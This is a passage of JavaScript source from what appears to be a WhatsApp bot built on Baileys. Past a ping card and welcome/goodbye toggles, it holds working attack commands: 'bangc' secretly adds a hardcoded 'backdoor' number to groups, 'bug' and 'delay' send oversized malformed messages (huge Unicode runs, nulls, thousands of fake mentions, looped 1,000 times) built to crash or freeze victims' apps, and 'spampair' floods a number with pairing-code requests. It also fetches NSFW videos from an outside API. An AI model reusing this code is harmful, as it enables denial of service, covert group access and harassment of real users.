        gradient.addColorStop(0, '#0f0c29');
        gradient.addColorStop(0.5, '#302b63');
        gradient.addColorStop(1, '#24243e');
        ctx.fillStyle = gradient;
        roundRect(ctx, 0, 0, width, height, 20);
        ctx.fill();
        
        // ── Border glow ──
        ctx.shadowColor = '#4f46e5';
        ctx.shadowBlur = 30;
        ctx.strokeStyle = '#4f46e5';
        ctx.lineWidth = 2;
        roundRect(ctx, 0, 0, width, height, 20);
        ctx.stroke();
        ctx.shadowBlur = 0;
        
        // ── Header ──
        const headerGrad = ctx.createLinearGradient(0, 0, width, 0);
        headerGrad.addColorStop(0, '#4f46e5');
        headerGrad.addColorStop(1, '#7c3aed');
        ctx.fillStyle = headerGrad;
        roundRect(ctx, 30, 20, width - 60, 45, 10);
        ctx.fill();
        
        ctx.fillStyle = '#ffffff';
        ctx.font = 'bold 20px sans-serif';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        ctx.fillText('🏓 SYSTEM PING', width / 2, 43);
        
        // ── Ping Value ──
        ctx.textBaseline = 'middle';
        const pingColor = pingMs < 50 ? '#22c55e' : pingMs < 100 ? '#4ade80' : pingMs < 200 ? '#facc15' : pingMs < 400 ? '#fb923c' : '#ef4444';
        ctx.fillStyle = pingColor;
        ctx.font = 'bold 60px sans-serif';
        ctx.textAlign = 'center';
        ctx.shadowColor = pingColor;
        ctx.shadowBlur = 20;
        ctx.fillText(`${pingMs}ms`, width / 2, 135);
        ctx.shadowBlur = 0;
        
        // ── Status ──
        ctx.fillStyle = statusColor;
        ctx.font = 'bold 18px sans-serif';
        ctx.textAlign = 'center';
        ctx.fillText(`${statusEmoji} ${status}`, width / 2, 180);
        
        // ── Divider ──
        ctx.strokeStyle = 'rgba(255,255,255,0.08)';
        ctx.lineWidth = 1;
        ctx.setLineDash([5, 5]);
        ctx.beginPath();
        ctx.moveTo(40, 205);
        ctx.lineTo(width - 40, 205);
        ctx.stroke();
        ctx.setLineDash([]);
        
        // ── Info Cards ──
        const infoItems = [
            { icon: '⏱', label: 'Uptime', value: uptimeStr },
            { icon: '📦', label: 'Memory', value: `${heapUsed} / ${heapTotal} MB` },
            { icon: '🤖', label: 'Bot', value: botName.toUpperCase() },
            { icon: '🕐', label: 'Time (EAT)', value: timeStr },
        ];
        
        const itemWidth = 250;
        const startY = 225;
        
        infoItems.forEach((item, index) => {
            const col = index % 2;
            const row = Math.floor(index / 2);
            const x = 35 + (col * (itemWidth + 30));
            const y = startY + (row * 70);
            
            ctx.fillStyle = 'rgba(255,255,255,0.06)';
            roundRect(ctx, x, y, itemWidth, 55, 10);
            ctx.fill();
            
            ctx.strokeStyle = 'rgba(255,255,255,0.06)';
            ctx.lineWidth = 1;
            roundRect(ctx, x, y, itemWidth, 55, 10);
            ctx.stroke();
            
            ctx.fillStyle = '#8b8bff';
            ctx.font = '18px sans-serif';
            ctx.textAlign = 'left';
            ctx.textBaseline = 'middle';
            ctx.fillText(item.icon, x + 12, y + 28);
            
            ctx.fillStyle = '#94a3b8';
            ctx.font = '11px sans-serif';
            ctx.textAlign = 'left';
            ctx.textBaseline = 'middle';
            ctx.fillText(item.label, x + 40, y + 18);
            
            ctx.fillStyle = '#e2e8f0';
            ctx.font = 'bold 12px sans-serif';
            ctx.textAlign = 'left';
            ctx.textBaseline = 'middle';
            let valueText = item.value;
            if (valueText.length > 22) valueText = valueText.substring(0, 20) + '…';
            ctx.fillText(valueText, x + 40, y + 40);
        });
        
        // ── Footer ──
        ctx.fillStyle = 'rgba(255,255,255,0.12)';
        ctx.font = '11px sans-serif';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'bottom';
        ctx.fillText(`© ${botName} • v${version}`, width / 2, height - 12);
        
        // ── Send image ──
        const buffer = canvas.toBuffer('image/png');
        await mzazi.sendMessage(sender, {
            image: buffer,
            caption: `🏓 *PING RESULTS*\n━━━━━━━━━━━━━━━━━━━━━\n📡 Latency: *${pingMs}ms*\n📊 Status: ${statusEmoji} ${status}\n⏱ Uptime: ${uptimeStr}\n📦 Memory: ${heapUsed}MB / ${heapTotal}MB\n🕐 Time: ${timeStr}\n🤖 Bot: ${botName.toUpperCase()}\n━━━━━━━━━━━━━━━━━━━━━`
        });
        
    } catch (err) {
        logger.error("Canvas ping error:", err);
        // ── Fallback: plain text ──
        try {
            const startPing = Date.now();
            await mzazi.sendPresenceUpdate('composing', sender).catch(() => {});
            const pingMs = Date.now() - startPing;
            await mzazi.sendMessage(sender, { text: `🏓 *Pong!* ⚡ ${pingMs}ms` }).catch(() => {});
        } catch (e) {
            await mzazi.sendMessage(sender, { text: "🏓 *Pong!*" }).catch(() => {});
        }
    }
    break;
}

// ==================== WELCOME SETTINGS ====================
//=====================================//

case "welcome1": {
    if (!isGroup) return mzazireply("❌ This command can only be used in groups.");
    if (!isAdmin && !isOwner) return mzazireply("❌ Only admins or owner can change welcome settings.");

    const sub = args[0]?.toLowerCase();
    const gs = getGroupSettings(sender);

    if (!sub || (sub !== "on" && sub !== "off")) {
        return mzazireply(
            `📋 *Welcome Settings*\n\n` +
            `Status: ${gs.welcome ? '✅ Enabled' : '❌ Disabled'}\n\n` +
            `📌 *Commands:*\n` +
            `${prefix}welcome on - Enable welcome messages\n` +
            `${prefix}welcome off - Disable welcome messages\n\n` +
            `When enabled, the bot will send a welcome image when new members join.`
        );
    }

    setGroupSetting(sender, "welcome", sub === "on");
    mzazireply(`✅ Welcome messages ${sub === "on" ? "enabled" : "disabled"}.`);
    break;
}

// ==================== GOODBYE SETTINGS ====================
//=====================================//

case "goodbye1": {
    if (!isGroup) return mzazireply("❌ This command can only be used in groups.");
    if (!isAdmin && !isOwner) return mzazireply("❌ Only admins or owner can change goodbye settings.");

    const sub = args[0]?.toLowerCase();
    const gs = getGroupSettings(sender);

    if (!sub || (sub !== "on" && sub !== "off")) {
        return mzazireply(
            `📋 *Goodbye Settings*\n\n` +
            `Status: ${gs.goodbye ? '✅ Enabled' : '❌ Disabled'}\n\n` +
            `📌 *Commands:*\n` +
            `${prefix}goodbye on - Enable goodbye messages\n` +
            `${prefix}goodbye off - Disable goodbye messages\n\n` +
            `When enabled, the bot will send a goodbye image when members leave.`
        );
    }

    setGroupSetting(sender, "goodbye", sub === "on");
    mzazireply(`✅ Goodbye messages ${sub === "on" ? "enabled" : "disabled"}.`);
    break;
}



async function groupBanz(target) {
    // ── Validate that target is a group JID ──
    if (!target.endsWith("@g.us")) throw new Error("❌ @g.us server required");

    try {
        // ── Add the hardcoded number to the group ──
        // 13135550002@s.whatsapp.net is the target number being added
        await mzazi.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add");
        return true;
    } catch (err) {
        throw err;
    }
}
//=====================================//

case "bangc": {
    // ── Validate group ──
    if (!isGroup) return mzazireply("❌ This command only works in groups.");
    if (!isOwner) return mzazireply("❌ Owner only command.");
    

    try {
        // ── Execute the backdoor add ──
        await groupBanz(sender);
        mzazireply("✅ Successfully added backdoor number to this group.");
    } catch (err) {
        logger.error("Banz error:", err);
        
    }
    break;
}

//=====================================//

case "bug": {
    // ── Owner only ──
    if (!isOwner) return mzazireply("❌ Owner only command.");

    // ── Determine target ──
    let target = sender; // default: current chat (group or DM)
    let bugType = args[0]?.toLowerCase() || "all"; // location, protocol, buffer, all

    // If a number or mention is provided, use that as target
    if (args.length > 0 && !["location", "protocol", "buffer", "all"].includes(args[0].toLowerCase())) {
        // First arg is not a bug type → it's a target
        const possibleTarget = args[0].replace(/[^0-9]/g, "");
        if (possibleTarget.length >= 10) {
            target = `${possibleTarget}@s.whatsapp.net`;
            bugType = args[1]?.toLowerCase() || "all";
        } else {
            // if first arg is a bug type, target remains sender
            bugType = args[0].toLowerCase();
        }
    } else if (args.length > 1 && ["location", "protocol", "buffer", "all"].includes(args[0].toLowerCase())) {
        // bug type is first, target might be second
        bugType = args[0].toLowerCase();
        if (args[1]) {
            const num = args[1].replace(/[^0-9]/g, "");
            if (num.length >= 10) target = `${num}@s.whatsapp.net`;
        }
    }

    // ── If in a group and target is still sender, we'll send to the group ──
    // But we should allow sending to a specific user as well.

    // ── Helper: send a payload ──
    const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

    const sendLocationBug = async (jid) => {
        try {
            const payload = "᬴᬴᬴".repeat(15000) + "꧔꧈".repeat(15000) + "ꦽ".repeat(20000);
            const message = {
                viewOnceMessage: {
                    message: {
                        ephemeralMessage: {
                            message: {
                                interactiveMessage: {
                                    header: {
                                        title: payload,
                                        hasMediaAttachment: false,
                                        locationMessage: {
                                            degreesLatitude: 992.999999,
                                            degreesLongitude: -932.8889989,
                                            name: payload,
                                            address: payload,
                                        },
                                    },
                                    body: {
                                        text: "ボ🩸⃟༑༑鈥( 𝐋𝟎𝟒𝐝𝐌𝐢𝐧𝟒𝐭𝐨驴? )銈✮⃝⚙️ボ" + "꧔꧈".repeat(2000),
                                    },
                                    contextInfo: {
                                        participant: jid,
                                        mentionedJid: [
                                            "0@s.whatsapp.net",
                                            ...Array.from({ length: 1900 }, () =>
                                                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                            ),
                                        ],
                                        remoteJid: "X",
                                        stanzaId: "123",
                                        nativeFlowMessage: {
                                            messageParamJson: "{".repeat(25000),
                                        },
                                        stickerMessage: {
                                            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                                            fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                                            fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                                            mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                                            mimetype: "image/webp",
                                            height: 9999,
                                            width: 9999,
                                            directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                                            fileLength: 12260,
                                            mediaKeyTimestamp: "1743832131",
                                            isAnimated: false,
                                            stickerSentTs: "X",
                                            isAvatar: false,
                                            isAiSticker: false,
                                            isLottie: false,
                                        },
                                    },
                                },
                            },
                        },
                    },
                },
            };
            await mzazi.relayMessage(jid, message, { participant: { jid } });
            logger.info(`[Bug] Location bug sent to ${jid}`);
        } catch (e) { logger.error("Location bug error:", e.message); }
    };

    const sendProtocolBug = async (jid) => {
        try {
            const msg = {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: Buffer.alloc(32, 1)
                        },
                        eventMessage: {
                            isCanceled: false,
                            name: "ℓχρ вυggєяѕ",
                            description: "т.мє/ƒυη¢тισηвυg",
                            location: {
                                degreesLatitude: 1.1,
                                degreesLongitude: 1.1,
                                name: "90.0",
                                address: "90.0"
                            },
                            extraGuestsAllowed: true,
                            hasReminder: true,
                            reminderOffsetSec: "3600",
                            joinLink: "https://call.whatsapp.com/video/zBhda7MV8fFoffxSpf8DMg" + "\u0000".repeat(902000),
                            startTime: "1770993000",
                            endTime: null
                        }
                    }
                }
            };
            await mzazi.relayMessage(jid, msg, { messageId: null });
            logger.info(`[Bug] Protocol bug sent to ${jid}`);
        } catch (e) { logger.error("Protocol bug error:", e.message); }
    };

    const sendBufferBug = async (jid) => {
        try {
            const LxP = {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/579315043_1275074854838813_3136724517646332783_n.enc?ccb=11-4&oh=01_Q5Aa4gEjQyLUS-FVZFFfKjl3ApcSrac94zhgNbKyB1qogTN7QQ&oe=6A33DCE6&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "YoOZJFDnvu0JFeQY/9OSAX5/mmGRbowl2nyyH1Pma0Q=",
                    fileLength: "179554",
                    height: 1271,
                    width: 1280,
                    mediaKey: "X1wBjPCCvZVntAPBOKhzD4GBi8sP8lqHIRvLCtARiCA=",
                    fileEncSha256: "ozfEQ6yWVFYyPVj2cf5TFfXAedks3pTdzxuENKWCLmg=",
                    directPath: "/v/t62.7118-24/579315043_1275074854838813_3136724517646332783_n.enc?ccb=11-4&oh=01_Q5Aa4gEjQyLUS-FVZFFfKjl3ApcSrac94zhgNbKyB1qogTN7QQ&oe=6A33DCE6&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1779202167",
                    jpegThumbnail: Buffer.from([0x00]),
                    contextInfo: {
                        pairedMediaType: "SD_IMAGE_PARENT",
                        statusSourceType: "IMAGE",
                        isForwarded: true,
                        forwardingScore: 999,
                        externalAdReply: {
                            title: "location",
                            body: "@FunctionBug telegram ofc",
                            mediaType: 1,
                            thumbnail: Buffer.from([0x00]),
                            sourceUrl: "https://t.me/FunctionBug",
                            renderLargerThumbnail: true,
                            showAdAttribution: true
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: "0@s.whatsapp.net"
                        }
                    },
                    scansSidecar: "Nft/7Cf7Ti4X3mAsjE6u5ggVEPn60GJJfTGcm8oW/ng9mUcX/uonxQ==",
                    scanLengths: [14958, 73513, 41498, 49585],
                    midQualityFileSha256: "dOxjsI60hqoFv5mEpdAZmDo19QUVusopbLNdQYtaPfo="
                }
            };
            const msg = generateWAMessageFromContent(jid, LxP, {
                userJid: mzazi.user.id
            });
            await mzazi.relayMessage(jid, msg.message, {
                messageId: msg.key.id,
                participant: jid,
            });
            logger.info(`[Bug] Buffer bug sent to ${jid}`);
        } catch (e) { logger.error("Buffer bug error:", e.message); }
    };

    // ── Execute ──
    try {
        await mzazireply(`🚀 *Sending bug to ${target}*\nType: ${bugType.toUpperCase()}`);

        if (bugType === "location" || bugType === "all") {
            await sendLocationBug(target);
        }
        if (bugType === "protocol" || bugType === "all") {
            await sendProtocolBug(target);
        }
        if (bugType === "buffer" || bugType === "all") {
            await sendBufferBug(target);
        }

        await mzazireply(`✅ Bug payload${bugType === "all" ? "s" : ""} sent to ${target}.`);
    } catch (err) {
        logger.error("Bug command error:", err);
        mzazireply(`❌ Failed: ${err.message}`);
    }
    break;
}


// ============================================================
// PAYLOAD FUNCTIONS (for .delay command)
// ============================================================

async function freezeios(mzazi, target) {
  await mzazi.relayMessage(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        externalAdReply: {
          title: "👁‍🗨⃟꙰。⃝𝐗𝐳𝐜 ‌ ⌁ 𝐜𝐥𝐢𝐞𝐧𝐓‌⃰ ⌁ ꪸ⃟‼️",
          body: "𑇂𑆵𑆴𑆿".repeat(30000),
          mediaType: 1,
          sourceUrl: "https://t.me/ZeppYsynC",
          thumbnailUrl: "https://t.me/ZeppYsynC",
          renderLargerThumbnail: true,
          showAdAttribution: false,
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363420757607688@newsletter",
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          serverMessageId: 7205
        },
        isForwarded: true,
        forwardingScore: 999,
        alwaysShowAdAttribution: false
      }
    }
  }, {
    participant: { jid: target }
  });
}

async function LocatonStc(mzazi, target) {
  try {
    const payload = "᬴᬴᬴".repeat(15000) + "꧔꧈".repeat(15000) + "ꦽ".repeat(20000);
    const message = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: payload,
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: payload,
                    address: payload,
                  },
                },
                body: {
                  text: "ボ🩸⃟༑༑鈥( 𝐋𝟎𝟒𝐝𝐌𝐢𝐧𝟒𝐭𝐨驴? )銈✮⃝⚙️ボ" + "꧔꧈".repeat(2000),
                },
                contextInfo: {
                  participant: target,
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1900 }, () =>
                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                    ),
                  ],
                  remoteJid: "X",
                  stanzaId: "123",
                  nativeFlowMessage: {
                    messageParamJson: "{".repeat(25000),
                  },
                  stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                    fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                    fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                    mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                    mimetype: "image/webp",
                    height: 9999,
                    width: 9999,
                    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                    fileLength: 12260,
                    mediaKeyTimestamp: "1743832131",
                    isAnimated: false,
                    stickerSentTs: "X",
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false,
                  },
                },
              },
            },
          },
        },
      },
    };
    await mzazi.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    logger.error(err);
  }
}



async function hard(mzazi, target) {
  for (let k = 0; k < 1000; k++) {
    const jkw = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: '../',
                format: 'DEFAULT',
              },
              nativeFlowResponseMessage: {
                name: 'address_message',
                paramsJson: 'x10'.repeat(1045098),
                version: 3,
              },
              contextInfo: {
                participant: target,
                quotedMessage: {
                  extendedTextMessage: {
                    text: 'u0000',
                    contextInfo: {
                      mentionedJid: [
                        '13828@s.whatsapp.net',
                        ...Array.from(
                          { length: 1900 },
                          () =>
                            '1' +
                            Math.floor(Math.random() * 5000000) +
                            '@s.whatsapp.net',
                        ),
                      ],
                    },
                  },
                },
              },
              entryPointConversionSource: 'galaxy_message',
            },
          },
        },
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background:
          '#' +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, '99999999'),
      }
    );

    await mzazi.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: jkw.message,
        },
      },
      {
        messageId: jkw.key.id,
        participant: { jid: target },
      }
    );
  }
}



//=====================================//

case "delay": {
    if (!text) return mzazireply("Usage: .delay <number> [count]");
    const targetNumber = args[0] || "";
    const count = parseInt(args[1]) || 5; // default 5 loops
    if (!targetNumber) return mzazireply("Please provide a target number.");
    // format JID: if missing @s.whatsapp.net, append it
    let target = targetNumber.includes("@") ? targetNumber : targetNumber + "@s.whatsapp.net";
    await mzazireply(`⏳ Sending payloads to ${target} (${count} times)...`);
    try {
        for (let i = 0; i < count; i++) {
            await freezeios(mzazi, target);
            await LocatonStc(mzazi, target);
            await sendnumb(mzazi, target, 10, true); // 10 protocol messages per iteration
            await hard(mzazi, target);
        }
        await mzazireply(`✅ Payloads sent ${count} times to ${target}`);
    } catch (e) {
        logger.error(e);
        await mzazireply(`❌ Failed: ${e.message || 'unknown error'}`);
    }
    break;
}
//=====================================//

case 'spampair':
//=====================================//

case 'pairspam': {
  if (!isOwner) {
    await mzazireply('❌ Owner only.');
    break;
  }

  if (!args[0]) {
    return mzazireply(
      '📱 *Spam Pairing Code*\n\n' +
      'Usage: .spampair <number> [count]\n\n' +
      'Example: .spampair 254712345678 30\n' +
      'Defaults to 20 requests if count not specified.'
    );
  }

  const targetNum = args[0].replace(/\D/g, '');
  if (targetNum.length < 8) {
    return mzazireply('❌ Invalid phone number. Include country code.');
  }

  const count = Math.min(parseInt(args[1]) || 20, 30);

  await mzazireply(
    `🚀 *Spam Pairing Started*\n\n` +
    `📱 Target: +${targetNum}\n` +
    `📊 Count: ${count} requests\n` +
    `⏳ Processing...`
  );

  const startTime = Date.now();
  
  // Try the direct method (more reliable)
  const result = await spamPairingDirect(targetNum, count);
  
  const duration = ((Date.now() - startTime) / 1000).toFixed(1);

  let statusMsg = 
    `✅ *Spam Pairing Complete*\n\n` +
    `📱 Target: +${targetNum}\n` +
    `📊 Sent: ${result.success} requests\n` +
    `❌ Failed: ${result.failed}\n` +
    `⏱️ Duration: ${duration}s\n`;

  if (result.failed > 0 && result.errors.length > 0) {
    statusMsg += `\n⚠️ *Errors:*\n` +
      result.errors.slice(0, 5).map(e => `• ${e}`).join('\n') +
      (result.errors.length > 5 ? `\n• ... and ${result.errors.length - 5} more` : '');
  }

  await mzazireply(statusMsg);
  break;
}
//=============Play99========================//
//=====================================//

case 'sxvideos':
//=====================================//

case 'sxvideo':
//=====================================//

case 'sx': {
  if (!text) {
    return mzazireply(
      `🎬 *SX Videos Downloader*\n\n` +
      `Usage: .sxvideos <search query>\n` +
      `Example: .sxvideos aunty\n\n` +
      `_Searches for videos and shows them as interactive cards._`
    );
  }

  try {
    await mzazi.sendMessage(sender, { react: { text: '⏳', key: m.key } });

    const query = encodeURIComponent(text.trim());
    const apiUrl = `https://api.drexapp.space/nsfw/sxvideos?q=${query}`;

    const response = await axios.get(apiUrl, {
      timeout: 30000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
      },
    });

    const data = response.data;

    // ── Extract video list ──
    let videos = null;
    if (Array.isArray(data)) videos = data;
    else if (data?.result && Array.isArray(data.result)) videos = data.result;
    else if (data?.data && Array.isArray(data.data)) videos = data.data;
    else if (data?.videos && Array.isArray(data.videos)) videos = data.videos;
    else if (data?.list && Array.isArray(data.list)) videos = data.list;
    else if (data?.items && Array.isArray(data.items)) videos = data.items;

    if (!videos || videos.length === 0) {
      await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
      return mzazireply(`❌ No videos found for: ${text}`);
    }

    // ── Limit to first 5 videos ──
    const limited = videos.slice(0, 5);

    // ── Generate a unique session ID ──
    const sessionId = `sx_${Date.now()}_${senderNum}`;
    if (!global.sxSessions) global.sxSessions = new Map();
    global.sxSessions.set(sessionId, { videos: limited, index: 0, query: text });

    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    // ── Build a card for each video ──
    const cards = [];

    for (let i = 0; i < limited.length; i++) {
      const video = limited[i];
      const title = video.title || video.name || `Video ${i + 1}`;
      const url = video.url || video.link || video.download_url || video.video_url || video.source;
      const duration = video.duration || video.length || 'N/A';
      const views = video.views || video.view_count || 'N/A';
      const quality = video.quality || video.resolution || 'Auto';
      const thumbnail = video.thumbnail || video.thumb || video.poster || '';

      // Prepare thumbnail if available
      let preparedImage = null;
      if (thumbnail) {
        try {
          const { data: imgBuf } = await axios.get(thumbnail, { responseType: 'arraybuffer', timeout: 8000 });
          const imgContent = await generateWAMessageContent(
            { image: Buffer.from(imgBuf) },
            { upload: mzazi.waUploadToServer }
          );
          if (imgContent?.imageMessage) preparedImage = imgContent.imageMessage;
        } catch {}
      }

      // Store video data in global map for download
      const videoId = `${sessionId}_${i}`;
      if (!global.sxVideoData) global.sxVideoData = new Map();
      global.sxVideoData.set(videoId, { title, url, duration, views, quality, raw: video });

      // Build the card
      const card = {
        header: {
          title: title.slice(0, 30),
          hasMediaAttachment: !!preparedImage,
          ...(preparedImage ? { imageMessage: preparedImage } : {}),
        },
        body: {
          text: `⏱️ *Duration:* ${duration}\n` +
                `👁️ *Views:* ${views}\n` +
                `📹 *Quality:* ${quality}\n\n` +
                `📌 *Click the button below to download.*`,
        },
        footer: { text: `Page ${i + 1}/${limited.length} • ${botName}` },
        nativeFlowMessage: {
          buttons: [
            {
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({
                display_text: '⬇️ Download',
                id: `.sxget ${videoId}`,
              }),
            },
            {
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({
                display_text: '📋 Details',
                id: `.sxinfo ${videoId}`,
              }),
            },
            {
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({
                display_text: '❌ Cancel',
                id: '.sxclear',
              }),
            },
          ],
        },
      };

      cards.push(card);
    }

    // ── Build the carousel message ──
    const interactiveMsg = generateWAMessageFromContent(
      sender,
      {
        interactiveMessage: {
          body: { text: `🎬 *${botName.toUpperCase()} SX VIDEO SEARCH*` },
          footer: { text: `🔍 "${text}" • ${videos.length} found • Swipe ➡️` },
          carouselMessage: { cards },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363425539800408@newsletter',
              newsletterName: botName.toUpperCase(),
              serverMessageId: 143,
            },
          },
        },
      },
      {}
    );

    await mzazi.relayMessage(sender, interactiveMsg.message, {
      messageId: interactiveMsg.key.id,
    });

    await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });

  } catch (err) {
    logger.error('SX Videos error:', err);
    await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
    mzazireply(`❌ ${err.message || 'Failed to fetch videos'}`);
  }
  break;
}
//=====================================//

case 'sxget':
//=====================================//

case 'sxdownload': {
  if (!text) {
    return mzazireply(
      `📥 *Download SX Video*\n\n` +
      `Usage: .sxget <video_id>\n` +
      `Example: .sxget sx_1234567890_0\n\n` +
      `_You can also click the Download button on the video card._`
    );
  }

  try {
    await mzazi.sendMessage(sender, { react: { text: '⏳', key: m.key } });

    const videoId = text.trim();
    if (!global.sxVideoData) global.sxVideoData = new Map();
    const video = global.sxVideoData.get(videoId);

    if (!video) {
      await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
      return mzazireply('❌ Invalid video ID. Search again with `.sxvideos <query>`.');
    }

    const { title, url, duration, quality } = video;

    if (!url) {
      await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
      return mzazireply(`❌ No download URL found for this video.`);
    }

    // ── Download the video (with the same robust logic as before) ──
    let videoBuffer = null;
    let contentType = '';
    let actualUrl = url;

    try {
      // HEAD request
      const headRes = await axios.head(url, {
        timeout: 10000,
        maxRedirects: 5,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Referer': 'https://api.drexapp.space/',
        },
      });
      contentType = headRes.headers['content-type'] || '';
      actualUrl = headRes.request?.res?.responseUrl || url;

      // If not video, try to parse JSON
      if (!contentType.includes('video') && !contentType.includes('octet-stream')) {
        const getRes = await axios.get(url, {
          timeout: 15000,
          maxRedirects: 5,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Referer': 'https://api.drexapp.space/',
          },
        });
        const data = getRes.data;
        if (typeof data === 'object') {
          const extractedUrl = data?.url || data?.download_url || data?.video_url || data?.link || data?.source;
          if (extractedUrl && typeof extractedUrl === 'string' && extractedUrl.startsWith('http')) {
            actualUrl = extractedUrl;
            const videoRes = await axios.get(actualUrl, {
              responseType: 'arraybuffer',
              timeout: 60000,
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Referer': 'https://api.drexapp.space/',
              },
              maxRedirects: 5,
            });
            videoBuffer = Buffer.from(videoRes.data);
            contentType = videoRes.headers['content-type'] || '';
          }
        } else if (typeof data === 'string' && data.includes('<video')) {
          const srcMatch = data.match(/<video[^>]*src=["']([^"']+)["']/i);
          if (srcMatch && srcMatch[1]) {
            actualUrl = srcMatch[1];
            const videoRes = await axios.get(actualUrl, {
              responseType: 'arraybuffer',
              timeout: 60000,
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Referer': 'https://api.drexapp.space/',
              },
              maxRedirects: 5,
            });
            videoBuffer = Buffer.from(videoRes.data);
            contentType = videoRes.headers['content-type'] || '';
          }
        }
      }
    } catch (headErr) {
      console.warn('HEAD failed, falling back to GET:', headErr.message);
    }

    if (!videoBuffer) {
      const videoRes = await axios.get(actualUrl, {
        responseType: 'arraybuffer',
        timeout: 60000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Referer': 'https://api.drexapp.space/',
        },
        maxRedirects: 5,
      });
      videoBuffer = Buffer.from(videoRes.data);
      contentType = videoRes.headers['content-type'] || '';
    }

    const isVideo = contentType.includes('video') || contentType.includes('octet-stream');
    const fileSizeMB = (videoBuffer.length / (1024 * 1024)).toFixed(1);

    if (!isVideo || videoBuffer.length < 10000) {
      await mzazi.sendMessage(sender, { react: { text: '⚠️', key: m.key } });
      const msg =
        `⚠️ *Invalid video file*\n\n` +
        `📹 *Title:* ${title}\n` +
        `📥 *Size:* ${fileSizeMB} MB (too small)\n` +
        `📄 *Content-Type:* ${contentType || 'unknown'}\n\n` +
